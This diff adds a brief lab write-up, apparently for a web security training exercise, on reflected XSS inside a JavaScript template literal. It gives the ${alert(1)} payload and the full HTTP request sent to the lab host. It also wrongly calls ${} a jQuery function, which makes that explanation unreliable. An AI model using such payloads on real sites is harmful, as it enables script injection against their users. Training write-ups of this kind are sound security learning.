@@ -1,0 +1,21 @@
+Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
+
+By using a random string (asdf) in the search field we can observe the string used in a JS:
+
+var message = `0 search results for 'asdf'`;
+
+We can replace this search string with ${alert(1)} to trigger an XSS
+The ${} is used for a new jQuerry library function
+
+Request:
+GET /?search=%24%7Balert%281%29%7D HTTP/1.1
+Host: ac281f251e43cae6803c54a90007005d.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://ac281f251e43cae6803c54a90007005d.web-security-academy.net/?search=%24%7Balert%281%29%7D
+Cookie: session=gWxnGmnfVcZHFo5ILQfIwqp205lmfhAU
+Upgrade-Insecure-Requests: 1
+
